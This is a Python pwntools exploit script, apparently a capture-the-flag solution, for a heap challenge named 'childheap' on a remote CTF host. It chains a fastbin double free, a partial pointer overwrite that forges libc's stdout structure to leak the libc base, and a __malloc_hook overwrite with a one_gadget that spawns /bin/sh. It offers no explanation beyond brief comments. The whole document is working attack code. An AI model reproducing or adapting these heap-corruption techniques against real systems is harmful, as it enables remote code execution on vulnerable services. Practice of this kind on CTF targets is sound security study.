from pwn import *
context.update(log_level = 'debug')

'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
def Malloc(idx, size, data):
	p.sendlineafter('> ', '1')
	p.sendlineafter(': ', str(idx))
	p.sendlineafter(': ', str(size))
	p.sendafter(': ', data)
def Free(idx):	
	p.sendlineafter('> ', '2')
	p.sendlineafter(': ', str(idx))
p = None
libc = ELF('/work/libc-ld.so/libc-2.23/64bit/libc.so.6')
offset_stdout = libc.symbols['_IO_2_1_stdout_']
toMallocHook = 0x13
offset_mallocHook = 0x3c4aed
offset_oneshot = 0xf02a4 #rsp+70 = null
addr_libc_mallocHook = None
addr_libc_stdout = None
addr_libc_base = None
addr_libc_oneshot = None
while True:
    #p = process('childheap')
    p = remote('ctf.j0n9hyun.xyz', 3033)
    Malloc(0, 0x60, '\xff'*(0x60 - 8)+p64(0x71))
    Malloc(1, 0x60, 'b'*0x58 + p64(0x71)) #unsorted chunk
    Malloc(2, 0x60, 'c'*24 + p64(0x51)) #to topchunk
    Free(0)
    Free(1)
    Free(0)
    Malloc(0, 0x60, '\x60')
    Malloc(1, 0x60, p64(0))
    Malloc(0, 0x60, '\x60') 
    Malloc(3, 0x60, p64(0) + p64(0x91)) # modify the size of chunk2 to unsorted bin's size(0x90) with fake chunk
    Free(1)
    Malloc(1, 0x60, p16(0x75dd)) #unsorted chunk
    Malloc(2, 0x60, p32(0xdeadbeef))

    Free(2)
    Free(3)
    Free(2)
    Malloc(2, 0x60, '\x70')
    Malloc(3, 0x60, p32(0xdeaddead))
    Malloc(4, 0x60, '\x70')
    Malloc(4, 0x60, p16(0x75dd))
    
    fakeStdout = '\x00'*0x33
    fakeStdout += p32(0xfbad1800) + p32(0)
    fakeStdout += p64(0)*3
    fakeStdout += '\x00'
    try:
        Malloc(4, 0x60, fakeStdout) #Allocate a chunk on a stdout stream in libc
        _recv = p.recv(100)
        if _recv.find('memory corruption') != -1:
            p.close()
            continue
        start = _recv.find(p32(0xfbad1800))
        addr_libc_stdout = u64(_recv[start+24+8:start+24+8+8]) | 0x20
        addr_libc_base = addr_libc_stdout - offset_stdout
        addr_libc_mallocHook = addr_libc_base + offset_mallocHook
        addr_libc_oneshot = addr_libc_base + offset_oneshot 
        log.info('libc base: ' + hex(addr_libc_base))
        log.info('stdout: ' + hex(addr_libc_stdout))
        log.info('malloc hook: ' + hex(addr_libc_mallocHook))
        log.info('oneshot: ' + hex(addr_libc_oneshot))
        break
    except:
        p.close()
        continue
Malloc(0, 0x60, 'a'*0x50)
Malloc(1, 0x60, 'b'*0x50)
Free(0)
Free(1)
Free(0)
Malloc(0, 0x60, p64(addr_libc_mallocHook))
Malloc(1, 0x60, 'b'*0x50)
Malloc(0, 0x60, p64(addr_libc_mallocHook))
Malloc(2, 0x60, '\x00'*toMallocHook + p64(addr_libc_oneshot))

p.interactive()

